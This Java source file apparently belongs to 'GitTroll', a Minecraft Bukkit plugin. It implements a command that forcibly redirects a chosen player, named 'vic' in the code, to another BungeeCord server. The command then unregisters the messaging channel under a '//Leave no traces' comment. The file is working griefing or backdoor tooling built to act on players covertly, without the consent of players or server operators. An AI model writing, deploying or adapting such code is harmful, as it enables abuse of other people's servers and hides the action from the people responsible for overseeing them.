package net.Lenni0451.GitTroll.command.commands.server;

import java.util.List;

import org.bukkit.Bukkit;

import com.google.common.io.ByteArrayDataOutput;
import com.google.common.io.ByteStreams;

import net.Lenni0451.GitTroll.GitTroll;
import net.Lenni0451.GitTroll.command.CommandBase;
import net.Lenni0451.GitTroll.utils.ArrayHelper;
import net.Lenni0451.GitTroll.utils.CustomPlayer;

public class BungeeRedirect extends CommandBase {

	public BungeeRedirect() {
		super("BungeeRedirect", "Redirect a player from one to another bungee server", "<Player> <Server>");
	}

	@Override
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isLength(2)) {
			CustomPlayer vic = this.parsePlayer(args.getString(0), executor);
			String server = args.getString(1);
			
			Bukkit.getMessenger().registerOutgoingPluginChannel(GitTroll.getInstance(), "BungeeCord");
			
			ByteArrayDataOutput out = ByteStreams.newDataOutput();
	        out.writeUTF("Connect");
	        out.writeUTF(server);
	        vic.getPlayer().sendPluginMessage(GitTroll.getInstance(), "BungeeCord", out.toByteArray());
	        //Leave no traces
			Bukkit.getMessenger().unregisterOutgoingPluginChannel(GitTroll.getInstance(), "BungeeCord");
	        executor.sendGitMessage("The redirect has been executed.");
		} else {
			this.commandWrong();
		}
	}

	@Override
	public void tabComplete(List<String> tabComplete, ArrayHelper args) {
		if(args.isEmpty()) {
			this.tabCompletePlayers(tabComplete);
		}
	}

}
